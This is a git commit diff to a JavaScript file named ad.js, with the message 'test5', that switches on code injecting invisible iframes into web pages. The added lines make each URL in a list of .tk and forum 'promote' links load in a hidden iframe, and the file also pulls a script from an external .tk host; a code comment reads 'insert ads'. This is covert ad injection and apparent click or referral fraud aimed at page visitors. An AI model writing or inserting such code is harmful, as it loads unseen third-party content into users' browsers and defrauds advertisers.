f7c39d95d1b8b8b078baa048783fdd990aea1754
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-08-22 16:25:20 +0800

    test5

--- ad.js
+++ ad.js
@@ -6,15 +6,15 @@ b.src = "http://www.7k77.tk/eicXsB?1503385493";
 //插广告
 var adList=[
     'http://www.hupress.tk/',
-    'http://adpays.net/v.php?user=4297',
+    // 'http://adpays.net/v.php?user=4297',
     'http://ptp.skillerzforum.com/promote.php?id=22979'
 ]
 for(var i=0,len=adList.length;i<len;i++){
     //iframe 
-    // var elemIF = document.createElement("iframe");
-    // elemIF.src = adList[i];
-    // elemIF.style.display = "none";
-    // (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(elemIF)
+    var elemIF = document.createElement("iframe");
+    elemIF.src = adList[i];
+    elemIF.style.display = "none";
+    (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(elemIF)
     //a标签
     var elemA=document.createElement("a");
     elemA.href=adList[i];
